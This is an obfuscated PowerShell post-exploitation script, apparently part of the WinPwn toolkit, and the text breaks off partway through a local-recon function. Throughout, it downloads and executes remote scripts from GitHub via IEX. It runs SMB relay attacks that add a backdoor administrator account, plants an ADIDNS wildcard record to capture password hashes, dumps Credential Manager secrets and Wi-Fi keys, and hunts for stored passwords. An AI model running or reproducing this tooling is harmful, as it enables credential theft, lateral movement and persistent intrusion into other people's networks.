

function DEpEnDEncYChECKs
{
    
    
         [int]${sy`s`TEmrOlE`id}   =   $(get-wmiObject -Class WIn32_COmPuTersysTEM )."Do`m`AiNROLe"



         ${sys`Te`M`ROLes}  = @{
                              0           =    ( ' Stan' +'dalon' +  'e W'  +  'o'+  'rk'  + 'station    ' )  ;  
                              1          =     (' Member Wor'  +  'kstat'+  'i' +  'on'+ '        '  )  ;  
                              2           =     (' S' +  'tand'  + 'alon' +'e Ser'+'ver '  +  ' ' +'       '  ) ; 
                              3          =     (  ' Me'  +'mber Serve'+ 'r' +  '   '  +  '       '  + '   ') ;
                              4          =    (  ' Ba'  +'ckup'  +  '  Domain C'+'on'+ 'trol' +  'ler'  +' '  ) ; 
                              5         =    (' Primary Do'+ 'main ' +  'C' + 'ontrolle' + 'r ' )       
         }

        
        proxydetect
        pathcheck
        ${p`SvERs`ioN}= ${pSver`sIO`NT`A`BLe}."Psver`sI`ON"."maj`Or"
        
        write-host (  '[?'+  '] ' +'Ch'+'eckin' +'g '  + 'fo'  + 'r '+ 'D' +  'e' +'fault '  +'Po'  + 'wer' +  'Shel'+ 'l ' +  'ver'+'sion ' +"..`n"  ) -ForegroundColor BlacK -BackgroundColor WhiTE   ; sleep 1
        
        if(  ${PSVer`SI`on} -lt 2){
           
                Write-Warning  ( '[!'+  '] '+  'You'+' ' + 'hav'  + 'e '  + 'Powe'+  'r'+  'Sh'+'ell '+ "v1.0.`n" )
            
                Write-Warning  ( '[!]'  +  ' '  +'This' + ' '  +  'script'  +  ' '+  'o'  +  'nly ' + 's'  +  'upp'  + 'orts ' +  'Po'  +'wer' + 'shell '  +'veri' + 'on '+  '2 ' +'or'  +  ' ' +  "above.`n"  )
            
                read-host ('Typ'  + 'e a'+  'ny key' +' ' +  'to conti' +  'nue'  +' ..' )
            
                exit  
        }
        
        write-host ( ' '+ ' '+ ' '  +  ' ' + ' ' +' '  +  ' ' +'[+'  + '] '  + '-'+  '----'  +  '> '  +' '  + 'P'+ 'o'+ 'we'+ 'rShell '+"v$PSVersion`n"  )   ;   sleep 1
        
        write-host ( '[?]' +  ' '+ 'De'  +  'tectin' + 'g' +  ' '+ 'sy'+ 'ste'  + 'm '  + 'role' + ' '  +"..`n"  ) -ForegroundColor BlaCK -BackgroundColor WHite  ; sleep 1
        
        ${SYste`Mrol`e`id}   =   $(get-wmiObject -Class wIN32_COMputERSySTEm  )."DomAi`N`R`Ole"
        
        if(${sY`steM`ROl`Eid} -ne 1 ){
        
                ( ' '  + ' '  +  ' '  + ' '+' ' + ' '+ ' '  + '[' + '-] '  +  'T' +'his '+  's'+'cript '  +  'n'+ 'eeds'+ ' '  +'access'  +' ' + 't' +  'o '+ 'the'+' '+  'dom'+ 'a'+ 'in. '  +'It'  +  ' ' + 'ca'  + 'n ' +'o' +'nly '  +'be'+  ' ' + 'ru'+ 'n '+  'on'  +' '  +  'a ' +'doma'  +  'i' +  'n '+ 'me'  + 'mb'+ 'er '  + "machine.`n")
               
                Read-Host (  'Typ'+ 'e any ke' +  'y '+'to' +' con' +'t' +'inue ..' )
                   
        }
        
        write-host ( '   '  +' '+ '   [+] ---'+  '-->'  ),${SYst`EM`ROlES}[[int]${sySteM`Ro`le`Id}],"`n"  ;   sleep 1
}

function pAtHChecK
{

    
        ${CURr`e`NTp`ATh} =  (  Get-Item -Path (  ('.{0}' )  -F [CHaR]92) -Verbose  )."FUl`LnAme"                
        Write-Host -ForegroundColor yeLLOw (  'C'  +  'reat' +  'ing/C'  +  'hec' + 'k'  +'i' +'ng Log Fo' + 'lder'+'s in'  + ' ')${CuRreNt`P`ATh} DIrEcTORy:
        
        if ( Test-Path $cuRReNtpATH\LOcalrecON\ )
        {
            
        }
        else {mkdir $CURRenTpAth\LocALrEcON\}
        
        if ( Test-Path $curReNtPath\domAinrECoN\  )
        {
            
        }
        else {mkdir $CuRRENTPath\dOmAinrECoN\; mkdir $CUrrEnTPATH\doMainRECON\ADRECON}
        
        if (Test-Path $CurReNTPATh\LOCalPRiVESC\ )
        {
            
        }
        else {mkdir $cUrReNtpaTh\localpRiveSc\}
        
        if ( Test-Path $CuRrENTPAtH\EXploItaTIOn\ )
        {
            
        }
        else {mkdir $CuRrEntPATh\eXplOITATiON\}

}


function ISadMin
{
    
    ${isA`d`mIn} =   ( [System.Security.Principal.WindowsPrincipal]  (   get-vAriaBle fjpkAM  ).VALue::"Ge`TcU`RrEnT"(   ))."I`SI`NroLe"(    (   VARiaBle (  'I23' +'VF')    ).VaLuE::"Ad`mI`NI`StratOr"  )
    return ${iSA`dm`IN}
}

function INVEIGH {

    pathcheck
    
    ${R`ELaYaT`T`A`Cks}  =  Read-Host -Prompt ( 'Do you want to e' +  'xecut'  +  'e SMB-R' +  'el' + 'a'+  'y att'+ 'a' + 'cks?'  + ' (yes/no)'  )
    if (${rela`Y`At`TacKS} -eq ( 'ye'  +'s'  ) -or ${R`eLAYa`Tta`Cks} -eq "y" -or ${R`elAY`A`TTAcKS} -eq ( 'Y'+'es'  ) -or ${rEL`AY`A`TtAcKs} -eq "Y" )
    {
        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.7.ps1'');WinPwn;}'
        ${T`ArgET}   =  Read-Host -Prompt (  'Please '  + 'E' +  'nte'  +  'r an '  +'IP-A'+ 'd'+  'res'+ 's as target f'+'or the relay' + ' attacks' )
        ${AD`mi`NGRoUP} =   Read-Host -Prompt ('Pleas' + 'e ' +'Enter the name of '  +  'your'+' l'+  'ocal admini' +  'stra'+ 'tor'  +'s group: ('+'var' +  'i' +'es f' +  'or ' +  'd'+ 'iffe' +  'ren'+ 't countrie'  +  's)')
        ${w`cl}   = new-object sYSTEm.NEt.wEBCLieNT
        ${w`cl}."prO`Xy"."CreD`EN`TialS"  =   (   Ls  ('vARi'  +  'Abl'+ 'e'+  ':bUe8t'  ) ).VALuE::"d`efau`lT`N`ETWOrKc`ReDE`NtiAls"

        IEX(New-Object NeT.WEBCLiEnt)."D`oWNlO`Ad`STrING"(  ('htt' + 'p' +'s:' + '/'+'/raw.git'+  'hubus'  +'erconten'  +'t.com'+'/'+ 'Se' +'cur' +'eThisShit/'+'Creds/maste'+  'r/Inveigh'  +'-Relay.ps1' ))
        IEX( New-Object net.webClIEnt)."D`oW`NL`OadST`RIng"( (  'h'  +  'ttps://ra' +'w.githubuse'  +  'rconte'  +'nt.' +'com/S'  +'ecureT'  + 'hisShit/C'+  'reds/ma' +  'st'  + 'er' +'/Invo'+  'ke-S'  +  'MBClient.' +  'ps1'  ))
        IEX(  New-Object NEt.WeBCLiENt  )."dow`NLoA`dstRI`NG"(  (  'h' + 'ttps://raw.gith'+'ubu' +  'se'  +  'rco'+'nt' + 'e'  + 'nt' +'.com'  + '/Secu' +'reThisShi' + 't/' + 'Cr'  + 'eds/' + 'master/'+  'Invo'  +'ke-'  + 'S'  +  'M'+ 'BEnum' +'.ps1' ) )
        IEX(New-Object nET.wEBCLIENT)."D`OwNLo`Ad`Str`Ing"(('https:'  +'/' +'/raw.githu' + 'b' +'usercontent.'+  'com/Sec'  + 'ureThisShit/Creds/m'+  'aster/I' + 'nvoke-S' +  'MBE'  +'xe'  + 'c.p'  + 's1' ))

        Invoke-InveighRelay -ConsoleOutput Y -StatusOutput n -Target ${T`AR`gET} -Command ( 'ne'+'t ' + 'user'+  ' '  +  'pwn'+'ed' +  ' ' +'0' +  'Wned'+  'Accou'+ 'nt! ' +  '/add;'  + ' ' +  'net'+  ' '+  'l'  +  'oca'+'lgroup'+  ' ' +"$admingroup "+  'p'  +  'wned '+  '/'  + 'add' ) -Attack ENUMeratE,exECUtE,sESsioN

        Write-Host ( 'You'  +' ca'  +  'n no'  +  'w '+ 'che'  + 'ck y'+  'o'+ 'ur sessions '+'with'+  ' G' +  'et'  +'-Inveig'+ 'h -Se'  +  'ssi'  + 'on '  + 'and use Invoke-SMBClient' +',' +' Invoke-SMB'+  'Enum and' + ' Invok'  +'e-'+'SMBExec '+'for fur' +  'th' +'er'+  ' rec' + 'on/e'  +'xpl' +'oit'+  'ati'  +'o' + 'n')
    }
    
    ${a`dIdNs} = Read-Host -Prompt ('Do y' + 'ou' + ' want t'+ 'o'  + ' s'+'tart ' +'Inveigh'  + ' with ' +'A'  + 'ctive ' +'D' +'irect'  +'ory-'  + 'I'+ 'n'  +'tegrate'  +  'd DNS '+ 'dy'+ 'na' + 'm'  + 'ic Up' +  'date attack? ('+'yes/no)')
    if ( ${a`DIdNs} -eq ( 'ye'+'s'  ) -or ${ADId`NS} -eq "y" -or ${A`diD`Ns} -eq (  'Y'+  'es') -or ${aD`idNS} -eq "Y")
    {   
        if ( isadmin  )
        {
                cmd /C sTaRT POWErsHelL -Command {${W`CL}   = new-object SyStem.NeT.wEbClieNT ;${W`cL}."PRo`XY"."C`R`edEnt`IaLS" =     (  GET-cHiLdiTeM  ('Va' +'R' +  'iAbLE:bUE'  +  '8T')  ).valUe::"d`eFAU`lTne`TwoRKCr`EdE`N`TIAls" ;IEX (New-Object nET.wEBcLIenT )."DoW`N`LO`AdsT`RIng"(  ('ht'  + 'tps://raw.g'  + 'ithubus'  +'er'+ 'c'  +'on'+ 'tent.com/' +'SecureT'+ 'hisS'  +  'hit'+  '/Cr'  +'e'  +  'ds/m'  +'as'  +  'ter' + '/In'+'veig' +'h.ps' +  '1')); Invoke-Inveigh -ConsoleOutput y -NBNS Y -mDNS y -HTTPS y -Proxy Y -ADIDNS coMBO -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $CUrrenTPAth\ ;}
		}
        else 
        {
               cmd /C sTArT PowERSHelL -Command {${W`CL}  =   new-object SysTEm.NeT.WEbcliENT  ; ${W`Cl}."P`ROXy"."cR`eDE`Nt`iaLs" =     $bUe8T::"D`Efa`UL`TNe`TwOrkCrEdeNTIA`Ls" ;IEX( New-Object neT.wEbcLIeNT )."D`OWNl`oAd`sTring"( ( 'https'+  '://raw'  + '.g' +'i'+ 'th'+'ubusercon'+  'te'  +'n'+ 't.co' +  'm/Secu'  +'re'  + 'T'+  'hi'+  'sShit/Creds/'  + 'mast' + 'e' + 'r/Invei'  + 'g' + 'h.p'  +  's1') ) ;Invoke-Inveigh -ConsoleOutput y -NBNS y -ADIDNS cOmBo -ADIDNSThreshold 2 -FileOutput y -FileOutputDirectory $cuRReNTPath\ ;  }
	    }
    }
    else
    {
        if ( isadmin )
        {
                cmd /C STaRT pOWERshEll -Command {${W`Cl} =   new-object sysTEM.NeT.WEbCliENt;${W`cL}."pr`oxY"."cRE`deNT`iAlS"  =    $BuE8t::"d`EfAUlTNet`W`oRk`CrED`en`T`iAlS";  IEX ( New-Object Net.wEbcLieNt )."DoWnLO`Ads`TRi`Ng"(  ('htt'  +  'ps:'  + '//'+  'raw'+  '.' +'git'  +  'hubus'  +  'e'+'rcontent.c'+  'om/Se' + 'c'  +'ureThisShit/Cr' +  'e'+ 'ds/' +  'm' +  'ast'  +  'er/Inveigh' +  '.' +  'ps1') ) ; Invoke-Inveigh -ConsoleOutput Y -NBNS y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y -FileOutputDirectory $cURREnTpaTH\  ;}
		
        }
        else 
        {
               cmd /C starT PoWeRSHell -Command {${W`CL}  =  new-object sYstEM.NET.webClIEnt;${w`Cl}."Pr`OXY"."cREDen`TI`ALS" =   $bUE8t::"De`Fa`ULtNE`TWO`RkcRe`DEnt`I`ALs" ;IEX( New-Object net.WEbcLIENT )."dO`w`N`lOADS`TrIng"( (  'htt'+ 'p'+'s://raw.githubusercon'  + 't' +  'ent.com' +'/Sec' +'u' + 'r' +  'eThi' + 'sShit/C'  + 'r' +  'e'+ 'ds/m'+'aster/Invei'+  'gh.ps'+ '1'  ) )  ;  Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput y -FileOutputDirectory $CurreNtpaTh\  ;}
	       
        }
    }
}


function aDIDnSwIldcard
{
    
    pathcheck
    ${ad`i`dNs} =  Read-Host -Prompt ('Ar'  +  'e' +' you '+ 'RE'  + 'A'  +  'LLY'+ ' '  +'su' +  're, t' +  'ha' +  't ' +  'y'  +'ou w'  + 'a'+  'nt '  + 'to '+  'create a Acti' + 've'  + ' Direc'  + 'tory-Integ' +'rated' +' '  +'DNS Wil' +'dc'+'a'+  'rd re'+'co'+  'rd?' +  ' Th'  + 'i'  + 's can '+'in the ' +  'worst case c'  +  'ause ne'+'t' +'wo'  + 'rk disrupt'+  'ions '+ 'f'+ 'or al' +'l clien'+  'ts and serve'+'r' + 's for t'+'h'+'e n'+  'ext h'  +  'ours! ('+  'yes'+ '/n'  + 'o'  +  ')'  )
    if (  ${Adid`Ns} -eq ( 'y' +'es'  ) -or ${ADiD`Ns} -eq "y" -or ${aDI`Dns} -eq ( 'Ye'  +  's') -or ${A`Di`DNs} -eq "Y" )
    {
        IEX(New-Object Net.WEbClIeNT )."Do`WnLoaD`sTRInG"( ('htt' +  'ps' +  '://raw'  +'.git'  + 'h' +  'u'  +'bus'  +  'erco'+'nten' + 't.' +  'com/'+  'Se'  +  'cureT'  +  'hi' + 'sShit/Creds/ma'  +'ste'  +  'r/P' + 'owe' +'rmad.'  +  'ps1'  ) )
        New-ADIDNSNode -Node * -Tombstone -Verbose
        Write-Host -ForegroundColor ReD (  'B' +'e '+'s' +'ure ' + 'to' +  ' '+ 're'  + 'mov'+  'e '+ 'th'+  'e '  +  'rec' +  'ord '+'with'  + ' '+( 'RT' +'oDisab' + 'le'  +'-ADI' +'DNS'+ 'Nod'  + 'e '  )."r`ep`lACE"( 'RTo','`'  )+ '-No' +  'de '  +  '* '  +  ( ( '-Verbose'  + 'mp'  +'4 ' )  -ReplACE 'mp4',[ChaR]96)+  'a'  +'t '  +'the' +' ' +  'e'  +  'nd '+'of' +  ' '+  'y'+'our '  +  't'  + 'ests' )
        Write-Host -ForegroundColor yElLOw (  'St'+  'artin' + 'g I' + 'nve'  +  'igh to captur'  +  'e'  +  ' '  + 'all t'  +  'hee'  +  'se ' +'m' +  'ass hashes' +':' )
        Inveigh
    }
           
}

function SESsioNgopHER 
{
    
    pathcheck
    ${c`U`RreNtPa`Th}  =  (Get-Item -Path ((  '.04A' )."rEpL`ACE"(( [CHAR]48 + [CHAR]52 +[CHAR]65  ),[StRing][CHAR]92  )  ) -Verbose)."Fu`lLNa`me"
    IEX (  New-Object NEt.WebClieNt  )."dOwN`LOAdst`R`i`Ng"( ('https://raw.gith'+'ubu'+ 'serco' +  'nt'+  'ent.com/SecureThisShit/Cre'+ 'ds/'  +  'master'  +  '/'  +'o'+'b' +'f'  +  'usca'+'t'+ 'edp'  + 's/se'+ 'goph' +'.p'  +  's1' ))
    ${w`hOle_d`o`M`AiN}   = Read-Host -Prompt ( 'Do you w'+'a'  +'nt to'  +' ' + 'st' +  'art SessionG' +'opher s'  +  'e'+'ar' +'ch over the wh'  +'ole domain? (yes/no) '  +  '- takes '+  'a' + ' '+  'lo'  +'t of t' +  'i'  +  'me' )
    if (${WHolE_D`oM`AIN} -eq (  'ye'+ 's'  ) -or ${WHolE`_d`OmAIN} -eq "y" -or ${wH`o`LE_DOMA`iN} -eq ('Ye' +'s'  ) -or ${whOlE_`DO`Main} -eq "Y"  )
    {
            ${sESsI`oN}  =  Read-Host -Prompt ( 'Do y'+  'o'+ 'u want t' + 'o' + ' star'  + 't ' +'S'  + 'essio' + 'n' +'Gopher w' +  'ith thorou' +'g'  + 'h tests? (yes/no) '+'- t' +  'ake'  + 's'  +' a ' +'fuckin'+  ' lot'  + ' '  +  'o'  +'f'+' time'  )
            if ( ${s`ES`sion} -eq ('ye'+ 's' ) -or ${se`sS`ION} -eq "y" -or ${SESs`i`on} -eq ( 'Y'  +'es'  ) -or ${S`E`SSIon} -eq "Y" )
            {
                Write-Host -ForegroundColor YElLoW (  'Start' + 'ing L' + 'ocal '  +  'S'+ 'ess'+  'i'  + 'onGoph'+ 'er,'  + ' output '  + 'is ge'+  'nerated' +  ' in ' )$CurREnTpaTh\lOcAlrEcoN\SeSSionGopHer.TxT:
                cachet -hdPXEKUQjxCYg9C -qMELeoMyJPUTJQY >> $cURrEntPAth\locAlRECON\SeSSIOngOpher.TXT -Outfile
            }
            else 
            {
                Write-Host -ForegroundColor YeLLOW (  'Start'+  'ing'+' S'  + 'ess' +'ionGopher wi'+  'thout tho'+ 'rough '  + 'tes'+'ts, ou' +  'tp' + 'ut is generated in ')$CuRRENtPATH\LOCaLRecOn\sEssIonGOpHer.txt:
                cachet -qMELeoMyJPUTJQY >> $cURrEnTpath\locAlrECOn\sEsSIonGOPher.tXT
            }
    }
    else
    {
        ${SE`ss`ION}   =  Read-Host -Prompt ( 'Do '  +  'you want '+'to'  +' start'+  ' Ses'+  's'+'ionGop'  + 'he' + 'r'+  ' '  +  'with th'+'oro'+ 'ug'  +'h tes' +'t'+'s? (yes' + '/' +  'no'  +  ')'  +  ' -'+  ' ' + 'takes a l'+ 'ot '  +  'of t' +  'ime'  )
            if (  ${s`E`SsiON} -eq ('ye'+  's') -or ${s`E`ssIoN} -eq "y" -or ${sE`s`sIon} -eq ('Ye'+  's') -or ${S`ess`iOn} -eq "Y"  )
            {
                Write-Host -ForegroundColor yElLOw ('Starting' + ' ' +'Local S'  +'essi'+  'onGopher, o'+ 'u' +  'tput i' +  's '+ 'g' + 'ene'+  'r' +'ated'  +' i'  +'n ' )$CurreNTPATH\loCALreCOn\SEsSiONgOPheR.txt:
                cachet -hdPXEKUQjxCYg9C >> $cUrReNtPATH\localREcoN\SeSSIongoPher.TXT -Outfile
            }
            else 
            {
                Write-Host -ForegroundColor YELLOW (  'St'  + 'arting Sessi' +'onGoph' +  'er without thoro'  +  'ugh tests,ou'+ 't'  +  'put' + ' '  + 'is gen' + 'erated '  +'in '  )$cURReNtPATh\localRecoN\sessionGopHeR.txT:
                cachet >> $curRentPaTH\lOcalREcON\sESsiOnGOpheR.TxT
            }
    }
}


function kiTTIelOcal 
{
    
    ${cu`Rr`ENTPa`Th}  = (  Get-Item -Path (  ( '.'  +  'N'+'aq' )."reP`LACe"((  [cHar]78  +  [cHar]97 + [cHar]113 ),[striNG][cHar]92  ) ) -Verbose)."Ful`lnaME"
    pathcheck
    if (  isadmin)
    {

            IEX (New-Object NET.wEbcLieNt  )."doWNLo`Ad`st`RI`Ng"(  ( 'https'+ '://raw.github'  +  'userc'  +  'ontent.com'  + '/Se'  +  'cureT'  +  'hisShit/Cre' + 'ds'  +'/ma'  +  'ste' +'r/G'+'et-W'+'LAN-Key'+ 's.ps1'  ) )
            iex (new-object net.weBCLIEnT )."doWNloAD`s`TRing"(( 'https'+  '://'  +'ra' +  'w.gith'+ 'ubu'+'se' + 'rconten' +  't'  +  '.co' +'m/Secur' +  'eT' + 'hisSh' +  'i' +'t/Cred' + 's/ma'  +'s'  + 'te'+'r/o'+ 'b'  +'fuscatedp' +  's/Du'+ 'm' +  'pWCM' + '.'  +  'p' +  's1'  ))

            Write-Host -ForegroundColor yelLow ( 'Dump' +'ing Win'+'dow' +  's '+  'Creden'+'tial Ma'  +'nager:'  )
            Invoke-WCMDump >> $cUrReNtPaTH\EXPloitatIoN\WCmCREdENTiAls.Txt
            
            ${OutpuT`_`FilE}  = Read-Host -Prompt ( 'Save c'+  'rede'+'ntials t'+  'o '+ 'a '  +'l'  +'o'  + 'cal te' + 'xt fi'  +'le'+  '?'  + ' (y' + 'e'  +'s/no)' )
            if (${o`UtP`Ut_`FILE} -eq (  'y'+ 'es') -or ${o`UTpUT_Fi`le} -eq "y" -or ${O`UTPu`T_`FIle} -eq ( 'Ye'  +  's' ) -or ${outPu`T`_`FilE} -eq "Y")
            {
                Write-Host -ForegroundColor yELlOW ( 'Dum'+  'ping' +  ' Creden'  +'tials' +  ' fro' + 'm ls' +'a'+'ss.'  +  'exe:')
                
                Get-WLAN-Keys >> $cURRenTpAtH\EXPlOItaTIOn\WifI_kEYs.txT
            }
            else
            {
            
            Get-WLAN-Keys
            }
    }
    else
    {
        Write-Host -ForegroundColor yELlow ('Y' +'ou' + ' nee'  +  'd '  + 'l' +'ocal'  +  ' admi' +  'n rig'  + 'hts'  +  ' for '  +  'this,'+' only dum' + 'ping Cr' + 'ede'+ 'n' + 'tia'  + 'l ' + 'Manage'+  'r n'+ 'ow!' )
        iex (new-object net.weBcLIENT )."DOw`NloAD`stRI`Ng"(  ('https://raw'  + '.'+'g'  +'ithubu'+'s' + 'erco'+ 'n' + 'tent' +'.co'+'m/Secu' +'r' + 'eThi' + 'sS'+'hit/C'  +  'red'+ 's/m' + 'aste' + 'r'+ '/obf'+  'u'+  'scatedp'  + 's/D'+ 'umpWCM.ps' + '1' ))
        Write-Host -ForegroundColor yelloW ('Dum'+'pin'+'g W'+  'ind'+'ow' +'s'+' Cr'+'e'+ 'd' +'ential Manager:'  )
        Invoke-WCMDump >> $cURRentPATH\eXplOiTaTIoN\wcmcrEDEntIAlS.txT
    }

}


function lOcALReCoNmODULes
{

    
            pathcheck
            ${CuRrENt`PA`Th}   =   (  Get-Item -Path (  ( '.Or'  +  'V'  )."r`eP`lace"( 'OrV','\' ) ) -Verbose)."FuLlNA`mE"
            IEX (New-Object nEt.weBclIeNT)."Downl`oA`ds`TR`iNG"((  'h'+'ttps:/'+ '/r'  +  'aw'+ '.gith'+  'ubusercont' +'ent' +  '.co' +  'm/S' +  'ecureThisSh'+'it'+  '/Creds/mas' +  'te' +  'r/' + 'Get-Comput'+'er'+  'D' + 'et' + 'a' +  'i'+ 'ls.p'  +  's1'))
            IEX ( New-Object NET.wEbClIENt )."dO`wN`LO`ADSTRInG"(  (  'https'  + '://raw.githu'  +  'buse'  +'rcontent'+ '.co'  +  'm/SecureThisShi'  + 't'  +'/Creds/maste'+'r/' +  'o' +  'bf' +  'uscatedps/vi'  +  'ew.ps'  +  '1' ))

            Write-Host -ForegroundColor yELLOw ('S'+'tarting local ' + 'Recon '  +'p' +'h' +  'ase:'  )
            
            Write-Host -ForegroundColor yElLoW ( 'Parsing Event ' +'logs ' +'f'+'o'  + 'r '  +  's' +'ensitive Inf'+ 'o'+ 'rm' +  'ation:')
              $bNtK9::"SEcUr`It`ypR`Oto`C`oL" =  ( variabLe 1T6x  -VALUeonlY )::"tLS`12"
            Invoke-WebRequest -Uri (  'htt' + 'ps'  +'://'  +  'github' +  '.com'  +  '/Se' + 'cureT'  + 'his' +  'Shit/Creds/raw/'+'mas' +  'ter/G'  + 'hos'+  'tpa' +'ck/EventLo'  +  'gP' +  'a'+  'rser.exe'  ) -Outfile "$currentPath\EventLogParser.exe"
            .\EventLogParser.exe EVeNtiD=4103 OuTfilE=$CurreNTPAth\LOcaLrECOn\EveNtlogsENSiTivEInForMations.TXT
            .\EventLogParser.exe EvENTId=4104 OUtFilE=$CUrrENTPAth\LOCAlrecoN\EveNtLOgSensItiVeINfoRmATIoNS.txt
            if ( isadmin){EventLogParser.exe eVENTiD=4688 OUTfiLE=$CUrReNtPaTH\LoCALreCOn\eVeNTLoGsENsITIVEiNforMAtions.tXt}


            
	        Write-Host -ForegroundColor yELLOw ('Che'+  'ckin'  + 'g for'+' WSUS'+  ' '+  'over'  +  ' ht'+ 't'  +  'p' )
            ${u`S`EWuServer}   =  ( Get-ItemProperty ( ('HKLM'  + ':'  + '{0}SO'  + 'FTW' + 'ARE{0}Poli'  + 'ci'  +'e' + 's{0'+  '}Micro'  +  'soft{0}W'+  'i'+'ndows{'+  '0}'+  'Win'  +  'dow'+'sU' +'pdate{' +'0}' +'AU')  -f  [cHar]92  ) -Name uSEWUSERVeR -ErrorAction siLeNTLycoNTinUe )."uS`e`wUsErVer"
            ${WUs`eR`Ver}  =   (  Get-ItemProperty (  (  'H'+ 'KLM:'+ 'N1USOFTWAREN'  +'1U'+  'Policie' +  'sN1'  +  'UMicrosoft'  +'N1UWindowsN1UWin'+ 'd'+ 'ow' +  's'+  'Upda'+'te' )  -rePLacE  ( [ChAR]78  +  [ChAR]49 +[ChAR]85),[ChAR]92) -Name wuSERvEr -ErrorAction sIlEntlYcONtINuE  )."w`UsE`RVeR"

            if(  ${us`e`WU`SeRvEr} -eq 1 -and ${WuSe`RvEr}."T`oloWer"(  )."s`TAR`TsWiTh"(  ( 'http:' + '//'  )) ) 
	        {
        	    Write-Host -ForegroundColor YeLLOW ( 'WSUS Server'+ ' ov'+ 'er' +' '  + 'H' +'TTP d' + 'etected, m'  + 'os'  +'t'  +  ' li'+  'kel'  + 'y a' +  'll hos' + 't'+ 's' +' in this domain c' + 'an' +  ' g'  +  'et' +  ' '  +  'fak' +'e-' +'U'+'p'+ 'dates!' )
		        echo (  'Ws' + 'us '+  'over'  +' ' +  'http'  +  ' '  +  'd' + 'etecte' + 'd' + '! '+  'Fa'+ 'ke '+  'U'+ 'pdat'+  'es ' +  'ca'  +  'n '+ 'be'  + ' '+'del' +'ive'+  'red '  +'her'  +  'e. ' +  "$UseWUServer "+'/ ' +"$WUServer "  + '') >> "$currentPath\LocalRecon\WsusoverHTTP.txt"
            }

            
            Write-Host -ForegroundColor YElloW (  'Check SM'  +  'B-'+'Sign' + 'ing '+  'fo'+  'r th' +  'e'+ ' loc'  +  'al ' +  's'+ 'ystem'  )
            iex (  new-object nET.wEbClient  )."dOW`N`L`O`AdsTRinG"( (  'http'  + 's://' +'raw.gith'  +  'ub'  +  'u'+'se'+ 'rco'+  'ntent.c'  +'om/SecureThisShit/Cre'+  'ds/ma' + 'st'+  'er/Invok' +'e-'  +  'SMBNegotiate.' +'p'+'s1'  ) )
            Invoke-SMBNegotiate -ComputerName LocaLHOSt >> "$currentPath\LocalRecon\SMBSigningState.txt"

            
            Write-Host -ForegroundColor YELLOw (( 'Col'  + 'lecting '  +'local' +  ' sy' +  'ste' +'m '+  'In'+  'format' +'ions f' +'or later lookup, saving them'  + ' t'+'o '+  '.{0}Local' + 'Recon{0}'  ) -f[cHar]92 )
            systeminfo >> "$currentPath\LocalRecon\systeminfo.txt"
            wmic QfE >> "$currentPath\LocalRecon\Patches.txt"
            wmic OS gET OSArCHITecturE >> "$currentPath\LocalRecon\Architecture.txt"
            Get-ChildItem ENv:   |   ft key,vaLUE >> "$currentPath\LocalRecon\Environmentvariables.txt"
            Get-PSDrive  |  where {${_}."p`ROViD`er" -like (  ('Mi' +  'c'+ 'rosoft'  +'.Pow' +  'erShell.' +  'Co' +'rewBpFil'  +  'eSyste' +  'm' )."RepL`A`cE"( 'wBp',[STrINg][chAr]92 ) )}|   ft Name,rOoT >> "$currentPath\LocalRecon\Drives.txt"
            whoami /pRiv >> "$currentPath\LocalRecon\Privileges.txt"
            Get-LocalUser  |   ft NAmE,enABlEd,LastlOGon >> "$currentPath\LocalRecon\LocalUsers.txt"
            net acCOunts >>  "$currentPath\LocalRecon\PasswordPolicy.txt"
            Get-LocalGroup  |  ft nAMe >> "$currentPath\LocalRecon\LocalGroups.txt"
            Get-NetIPConfiguration  |  ft InTErfaCealIas,INtERfacEdeSCRIptiOn,iPv4aDdresS >> "$currentPath\LocalRecon\Networkinterfaces.txt"
            Get-DnsClientServerAddress -AddressFamily IPv4   | ft >> "$currentPath\LocalRecon\DNSServers.txt"
            Get-NetRoute -AddressFamily IPv4 | ft DestINaTiONprEfIX,NeXthOP,routEMetriC,ifIndeX >> "$currentPath\LocalRecon\NetRoutes.txt"
            Get-NetNeighbor -AddressFamily IPv4 |  ft IfiNdEX,iPaDdRESS,LinKlAYeRaDdrESs,STATE >> "$currentPath\LocalRecon\ArpTable.txt"
            netstat -ano >> "$currentPath\LocalRecon\ActiveConnections.txt"
            net sHAre >> "$currentPath\LocalRecon\Networkshares.txt"
	    Get-Installedsoftware -Property DIsPlayveRsioN,InstaLlDate >> "$currentPath\LocalRecon\InstalledSoftwareAll.txt"
            
	    iex (new-object neT.weBCLienT  )."D`owNL`oAdS`TRIng"( ('https:' +'//r'  + 'aw.githubus'  + 'er'  +  'content.co' +  'm/Se'+ 'cureThisS'+ 'hit/Cre' + 'ds/' +'m'  +  'aster/' +'Invoke-Vulmap'  +'.p' + 's1'  )  )
	    Invoke-Vulmap >> "$currentPath\LocalRecon\VulnerableSoftware.txt"
            
            ${PASS`H`U`Nt}  = Read-Host -Prompt (  'D'  + 'o'  +' y'+'ou want to search for Pa'+'s'  +'s' +'w' + 'ords on '+'this'  +  ' '  +'s'  +  'ystem'+ ' using p'+ 'assh'  +'un'+  't.exe? (It' + 's ' + 'wor' +  'th '+  'it'  +') '  +  '(ye'  +'s'+'/no'+')')
            if (${paS`Sh`UnT} -eq ('ye'+'s'  ) -or ${pAsSH`U`NT} -eq "y" -or ${PAss`HUnt} -eq ('Y'  + 'es' ) -or ${P`ASS`hunt} -eq "Y" )
            {
                passhunt -local ${tr`Ue}
            }
            
            
            Write-Host -ForegroundColor YELLow ('Ch'+ 'eckin'  +  'g'  + ' f'+'or '+'acces'+ 'ib'  +  'le' +  ' S' +  'AM'+'/SYS Files')
